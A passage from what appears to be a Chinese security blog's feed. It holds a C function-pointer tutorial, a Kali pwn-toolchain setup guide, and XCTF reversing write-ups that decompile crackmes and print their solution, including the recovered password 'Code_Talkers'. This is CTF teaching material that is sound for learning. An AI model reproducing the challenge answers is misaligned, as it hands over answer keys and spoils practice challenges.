href="https://www.zhihu.com/question/36171464">为什么heap spary要用0x0C0C0C0C这个奇怪的数字？</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;为什么heap-spary要用0x0c0c0c0c这个奇怪的数字&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#为什么heap-spary要用0x0c0c0c0c这个奇怪的数字&quot;&gt;&lt;/a&gt; 为什么heap spary要用0x0C0C0C</summary>
      
    
    
    
    <category term="0day安全" scheme="https://www.rgzzplus.com/categories/0day%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="HeapSpary" scheme="https://www.rgzzplus.com/tags/HeapSpary/"/>
    
  </entry>
  
  <entry>
    <title>函数指针</title>
    <link href="https://www.rgzzplus.com/2022/07/27/%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88/"/>
    <id>https://www.rgzzplus.com/2022/07/27/%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88/</id>
    <published>2022-07-27T07:57:50.000Z</published>
    <updated>2022-08-01T10:30:12.616Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="函数指针的定义"><a class="markdownIt-Anchor" href="#函数指针的定义"></a> 函数指针的定义</h1><p>程序中的每个函数都位于内存中的某个位置，所以存在**指向那个位置的指针（函数指针）**是完全可能的。</p><p>函数指针定义形式：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">returnType (*pointerName)(param <span class="built_in">list</span>);</span><br><span class="line"><span class="comment">//例子</span></span><br><span class="line"><span class="type">int</span> (*pf)();</span><br></pre></td></tr></table></figure><p>returnType 为函数返回值类型，pointerNmae 为指针名称，param list 为函数参数列表。参数列表中可以同时给出参数的类型和名称，也可以只给出参数的类型，省略参数的名称，这一点和函数原型非常类似。</p><blockquote><p>注意<code>( )</code>的优先级高于<code>*</code>，第一个括号不能省略，如果写作<code>returnType *pointerName(param list);</code>就成了函数原型，它表明函数的返回值类型为<code>returnType *</code>。</p></blockquote><h1 id="函数指针的用法"><a class="markdownIt-Anchor" href="#函数指针的用法"></a> 函数指针的用法</h1><p>初始化函数指针的方法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> (*pf)(<span class="type">int</span>) = &amp;f;  </span><br></pre></td></tr></table></figure><p>初始化表达式中的&amp;操作符是可选的，因为函数名被使用时总是由编译器把它转换为函数指针。&amp;操作符只是显式地说明了编译器将隐式执行的任务。</p><p>在函数指针被声明并且初始化之后，我们就可以使用三种方式调用函数:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> ans;</span><br><span class="line">ans = f(<span class="number">25</span>);</span><br><span class="line">ans = (*pf)(<span class="number">25</span>);</span><br><span class="line">ans = pf(<span class="number">25</span>);</span><br></pre></td></tr></table></figure><p>第1条语句简单地<strong>使用名字调用函数f</strong>， 但它的<strong>执行过程</strong>可能和你想象的不太一样。函数名 f 首先被转换为一个函数指针，该指针指定函数在内存中的位置。然后，函数调用操作符调用该函数，执行开始于这个地址的代码。</p><p>第2条语句<strong>对pf执行间接访问操作</strong>，它把函数指针转换为一个函数名。这个转换并不是真正需要的，因为编译器在执行函数调用操作符之前又会把它转换回去。不过，这条语句的效果和第1条语句是完全一样的。</p><p>第3条语句和前两条语句的效果是一样的。间接访问操作并非必需，因为编译器需要的是一个函数指针。这个例子显示了函数指针通常是如何使用的。</p><blockquote><p>参考：</p><p>​<a href="http://c.biancheng.net/cpp/html/3248.html">C语言函数指针（指向函数的指针）</a></p><p>​C和指针</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;函数指针的定义&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#函数指针的定义&quot;&gt;&lt;/a&gt; 函数指针的定义&lt;/h1&gt;
&lt;p&gt;程序中的每个函数都位于内存中的某个位置，所以存在**指向那个位置的指针（函数指针）**是</summary>
      
    
    
    
    <category term="学习笔记" scheme="https://www.rgzzplus.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="c" scheme="https://www.rgzzplus.com/tags/c/"/>
    
    <category term="函数指针" scheme="https://www.rgzzplus.com/tags/%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88/"/>
    
  </entry>
  
  <entry>
    <title>kali搭建pwn环境</title>
    <link href="https://www.rgzzplus.com/2022/07/27/kali%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/"/>
    <id>https://www.rgzzplus.com/2022/07/27/kali%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/</id>
    <published>2022-07-27T07:32:48.000Z</published>
    <updated>2022-08-01T11:18:47.431Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="系统环境"><a class="markdownIt-Anchor" href="#系统环境"></a> 系统环境</h1><p>**系统环境：**Linux kali 5.14.0-kali4-amd64 (2021-11-05)</p><h1 id="搭建步骤"><a class="markdownIt-Anchor" href="#搭建步骤"></a> 搭建步骤</h1><h2 id="第一步"><a class="markdownIt-Anchor" href="#第一步"></a> 第一步</h2><p>在主目录下创建一个 tools 目录，用来存放下载下来的文件，命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> tools</span><br></pre></td></tr></table></figure><p><img src="/2022/07/27/kali%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20220724105421464.png" alt="image-20220724105421464"></p><h2 id="第二步"><a class="markdownIt-Anchor" href="#第二步"></a> 第二步</h2><p>安装pwntools</p><ol><li>进入tools文件夹里面</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> tools</span><br></pre></td></tr></table></figure><p><img src="/2022/07/27/kali%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20220724105554318.png" alt="image-20220724105554318"></p><ol start="2"><li>把 pwntools clone下来</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/Gallopsled/pwntools.git</span><br></pre></td></tr></table></figure><p><img src="/2022/07/27/kali%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20220724110621476.png" alt="image-20220724110621476"></p><ol start="3"><li>安装所需环境</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential</span><br></pre></td></tr></table></figure><p><img src="/2022/07/27/kali%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20220724111211189.png" alt="image-20220724111211189"></p><p><img src="/2022/07/27/kali%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20220724112043388.png" alt="image-20220724112043388"></p><ol start="4"><li>更新 pip</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip install --upgrade pip</span><br></pre></td></tr></table></figure><p>我之前安装过python3 和相关的依赖，所以才会出现 黄字</p><p><img src="/2022/07/27/kali%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20220724112358360.png" alt="image-20220724112358360"></p><ol start="5"><li>使用 pip 安装并更新 pwntools</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip install --upgrade pwntools</span><br></pre></td></tr></table></figure><p><img src="/2022/07/27/kali%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20220724120351366.png" alt="image-20220724120351366"></p><p>到这里 pwntools 环境已经搭建好了</p><h2 id="搭建gdb调试环境"><a class="markdownIt-Anchor" href="#搭建gdb调试环境"></a> 搭建gdb调试环境</h2><ol><li>安装gdb-multiarch，用作gdb客户端进行调试，是任何架构的通用客户端</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gdb-multiarch</span><br></pre></td></tr></table></figure><p><img src="/2022/07/27/kali%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20220724120607625.png" alt="image-20220724120607625"></p><p>检查安装是否成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb -v</span><br></pre></td></tr></table></figure><p><img src="/2022/07/27/kali%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20220724120626220.png" alt="image-20220724120626220"></p><ol start="2"><li>安装插件</li></ol><p>pwndbg是一个方便 gdb 使用的插件</p><p>先将pwndbg git 下来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg.git</span><br></pre></td></tr></table></figure><p><img src="/2022/07/27/kali%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20220724121020311.png" alt="image-20220724121020311"></p><p>然后进入到文件夹中，执行 <a href="http://setup.sh">setup.sh</a> 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/tools/pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure><p><img src="/2022/07/27/kali%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20220724121220606.png" alt="image-20220724121220606"></p><p>检查插件是否挂载成功，在终端输入gdb，结果如下：</p><p><img src="/2022/07/27/kali%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20220724134953067.png" alt="image-20220724134953067"></p><p>其它插件peda，def安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/longld/peda.git</span><br></pre></td></tr></table></figure><p><img src="/2022/07/27/kali%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20220724135333030.png" alt="image-20220724135333030"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/hugsy/gef.git  </span><br></pre></td></tr></table></figure><p><img src="/2022/07/27/kali%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20220724135910787.png" alt="image-20220724135910787"></p><p>安装插件依赖</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install keystone-engine ropper keystone-engine</span><br></pre></td></tr></table></figure><p><img src="/2022/07/27/kali%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20220724140304432.png" alt="image-20220724140304432"></p><p>在这里我发现我没有切换目录下载插件，但是没关系，我们将gef 和peda 文件夹放到tools里</p><p>在 gdbinit 中挂载插件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim ~/.gdbinit</span><br></pre></td></tr></table></figure><p>按 i 键编辑，从第二行开始输入下面内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#source /home/kali/tools/peda/peda.py</span></span><br><span class="line"><span class="comment">#source /home/kali/tools/gef/gef.py</span></span><br></pre></td></tr></table></figure><p><img src="/2022/07/27/kali%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20220724140843053.png" alt="image-20220724140843053"></p><p>选择插件中的其中一个，其他的注释掉，按esc键并输入:wq退出即可。</p><p>至此，pwn环境搭建完成。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;系统环境&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#系统环境&quot;&gt;&lt;/a&gt; 系统环境&lt;/h1&gt;
&lt;p&gt;**系统环境：**Linux kali 5.14.0-kali4-amd64 (2021-11-05)&lt;/</summary>
      
    
    
    
    <category term="工具" scheme="https://www.rgzzplus.com/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="pwn" scheme="https://www.rgzzplus.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界Reversing-x64Elf-100</title>
    <link href="https://www.rgzzplus.com/2022/07/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CReversing-x64Elf-100/"/>
    <id>https://www.rgzzplus.com/2022/07/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CReversing-x64Elf-100/</id>
    <published>2022-07-24T02:39:54.000Z</published>
    <updated>2022-07-24T02:42:33.525Z</updated>
    
    <content type="html"><![CDATA[<p>附件下载下来，后缀是 .re，起初我还以为是压缩文件，拖进bandizip结果识别为未知文件格式。</p><blockquote><p>google：.re 文件大多属于 Image File。<a href="https://filext.com/file-extension/~RE">原文</a></p></blockquote><p>然后我试着拖进 IDA，能解析。</p><p><img src="/2022/07/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CReversing-x64Elf-100/image-20220722195957027.png" alt="image-20220722195957027"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">264</span>]; <span class="comment">// [rsp+0h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+108h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !fgets(s, <span class="number">255</span>, <span class="built_in">stdin</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)sub_4006FD((__int64)s) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Incorrect password!&quot;</span>);</span><br><span class="line">    result = <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Nice!&quot;</span>);</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从反汇编代码中可以看到 sub_40006FD 函数是关键。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_4006FD</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-24h]</span></span><br><span class="line">  __int64 v3[<span class="number">4</span>]; <span class="comment">// [rsp+18h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v3[<span class="number">0</span>] = (__int64)<span class="string">&quot;Dufhbmf&quot;</span>;</span><br><span class="line">  v3[<span class="number">1</span>] = (__int64)<span class="string">&quot;pG`imos&quot;</span>;</span><br><span class="line">  v3[<span class="number">2</span>] = (__int64)<span class="string">&quot;ewUglpt&quot;</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">11</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(<span class="type">char</span> *)(v3[i % <span class="number">3</span>] + <span class="number">2</span> * (i / <span class="number">3</span>)) - *(<span class="type">char</span> *)(i + a1) != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>*(char *)(v3[i % 3] + 2*(i / 3)) 是一个二维数组，它与 a1[i] 相差 1。</p><p>要想得到 a1 ，就 *(char *)(v3[i % 3] + 2*(i / 3)) - 1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a=[<span class="string">&quot;Dufhbmf&quot;</span>,<span class="string">&quot;pG`imos&quot;</span>,<span class="string">&quot;ewUglpt&quot;</span>]</span><br><span class="line">s=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    s+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(a[i % <span class="number">3</span>][<span class="number">2</span> * <span class="built_in">int</span>(i / <span class="number">3</span>)])-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s)</span><br></pre></td></tr></table></figure><p>结果：Code_Talkers</p><blockquote><p>注意：用 int(i/3) 是由于 python 不会像 c/c++ 一样自动将触发取整。</p></blockquote><blockquote><p>参考:<a href="https://www.cnblogs.com/dyhaohaoxuexi/p/10610272.html">Reversing-x64Elf-100</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;附件下载下来，后缀是 .re，起初我还以为是压缩文件，拖进bandizip结果识别为未知文件格式。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;google：.re 文件大多属于 Image File。&lt;a href=&quot;https://filext.com/file-exten</summary>
      
    
    
    
    <category term="CTF" scheme="https://www.rgzzplus.com/categories/CTF/"/>
    
    
    <category term="攻防世界" scheme="https://www.rgzzplus.com/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
    <category term="reverse" scheme="https://www.rgzzplus.com/tags/reverse/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界666</title>
    <link href="https://www.rgzzplus.com/2022/07/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C666/"/>
    <id>https://www.rgzzplus.com/2022/07/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C666/</id>
    <published>2022-07-24T02:39:11.000Z</published>
    <updated>2022-07-24T02:41:47.094Z</updated>
    
    <content type="html"><![CDATA[<p>题目地址：<a href="https://adworld.xctf.org.cn/challenges/details?hash=b77f33bb-046b-4be9-8507-00dacd0358fc_2">666</a></p><p>将附件下载到本地后，直接拖进 IDA 进行分析，点击进入 main 函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"> ; =============== S U B R O U T I N E =======================================</span><br><span class="line"> ; Attributes: bp-based frame</span><br><span class="line"></span><br><span class="line"> ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">                 public main</span><br><span class="line"> main            proc near               ; DATA XREF: _start+1D↑o</span><br><span class="line"></span><br><span class="line"> s               = byte ptr -1E0h   ; s[480]</span><br><span class="line"> var_F0          = byte ptr -0F0h   ; var_fo[240],存放scanf输入参数</span><br><span class="line"></span><br><span class="line"> ; __unwind &#123;</span><br><span class="line">            push    rbp</span><br><span class="line">            mov     rbp, rsp</span><br><span class="line">            sub     rsp, 1E0h</span><br><span class="line">            lea     rax, [rbp+s]</span><br><span class="line">            mov     edx, 1Eh        ; n</span><br><span class="line">            mov     esi, 0          ; c</span><br><span class="line">            mov     rdi, rax        ; s</span><br><span class="line">            call    _memset; memset(s, 0, 0x1EuLL);</span><br><span class="line">            </span><br><span class="line">            lea     rdi, format     ; &quot;Please Input Key: &quot;</span><br><span class="line">            mov     eax, 0</span><br><span class="line">            call    _printf</span><br><span class="line">            </span><br><span class="line">            lea     rax, [rbp+var_F0]</span><br><span class="line">            mov     rsi, rax</span><br><span class="line">            lea     rdi, aS         ; &quot;%s&quot;</span><br><span class="line">            mov     eax, 0</span><br><span class="line">            call    ___isoc99_scanf</span><br><span class="line">            </span><br><span class="line">            lea     rdx, [rbp+s]</span><br><span class="line">            lea     rax, [rbp+var_F0]</span><br><span class="line">            mov     rsi, rdx</span><br><span class="line">            mov     rdi, rax</span><br><span class="line">            call    encode;关键函数，这里对输入字符进行了加密</span><br><span class="line">            </span><br><span class="line">            lea     rax, [rbp+var_F0]</span><br><span class="line">mov     rdi, rax        ; s</span><br><span class="line">call    _strlen</span><br><span class="line">mov     rdx, rax</span><br><span class="line">mov     eax, cs:key</span><br><span class="line">cdqe</span><br><span class="line">cmp     rdx, rax</span><br><span class="line">jnz     short loc_138D</span><br><span class="line">lea     rax, [rbp+s]</span><br><span class="line">lea     rsi, enflag     ; &quot;izwhroz\&quot;\&quot;w\&quot;v.K\&quot;.Ni&quot;</span><br><span class="line">mov     rdi, rax        ; s1</span><br><span class="line">call    _strcmp</span><br><span class="line">test    eax, eax</span><br><span class="line">jnz     short loc_1381</span><br><span class="line">lea     rdi, aYouAreRight ; &quot;You are Right&quot;</span><br><span class="line">call    _puts</span><br><span class="line">jmp     short loc_138D</span><br><span class="line"> ; ---------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"> loc_1381:                               ; CODE XREF: main+A0↑j</span><br><span class="line">lea     rdi, aFlagThis1sF4ck ; &quot;flag&#123;This_1s_f4cker_flag&#125;&quot;</span><br><span class="line">            call    _puts</span><br><span class="line"></span><br><span class="line"> loc_138D:                               ; CODE XREF: main+86↑j</span><br><span class="line">                                         ; main+AE↑j</span><br><span class="line">            mov     eax, 0</span><br><span class="line">            leave</span><br><span class="line">            retn</span><br><span class="line">; &#125; // starts at 12D1</span><br><span class="line"> main       endp</span><br></pre></td></tr></table></figure><p>按下 F5 ，反汇编，这下就清楚程序运行逻辑了，程序对输入字符进行字符编码，然后与 enflag（“izwhroz”“w&quot;v.K”.Ni&quot;）进行比较。。。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">240</span>]; <span class="comment">// [rsp+0h] [rbp-1E0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">240</span>]; <span class="comment">// [rsp+F0h] [rbp-F0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x1E</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please Input Key: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, v5);</span><br><span class="line">  encode(v5, (__int64)s);<span class="comment">//关键函数</span></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(v5) == key )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s, enflag) )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;You are Right&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;flag&#123;This_1s_f4cker_flag&#125;&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以关键是要知道 encode 函数怎么加密输入的，之后用 encode 解密enflag</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">encode</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v3[<span class="number">104</span>]; <span class="comment">// [rsp+10h] [rbp-70h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+7Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(a1) != key )<span class="comment">//12h,18位</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Your Length is Wrong&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; key; i += <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3[i + <span class="number">64</span>] = key ^ (a1[i] + <span class="number">6</span>);</span><br><span class="line">    v3[i + <span class="number">33</span>] = (a1[i + <span class="number">1</span>] - <span class="number">6</span>) ^ key;</span><br><span class="line">    v3[i + <span class="number">2</span>] = a1[i + <span class="number">2</span>] ^ <span class="number">6</span> ^ key;<span class="comment">//加密算法</span></span><br><span class="line">      </span><br><span class="line">    *(_BYTE *)(a2 + i) = v3[i + <span class="number">64</span>];</span><br><span class="line">    *(_BYTE *)(a2 + i + <span class="number">1LL</span>) = v3[i + <span class="number">33</span>];</span><br><span class="line">    *(_BYTE *)(a2 + i + <span class="number">2LL</span>) = v3[i + <span class="number">2</span>];<span class="comment">//指针赋值</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a2;</span><br><span 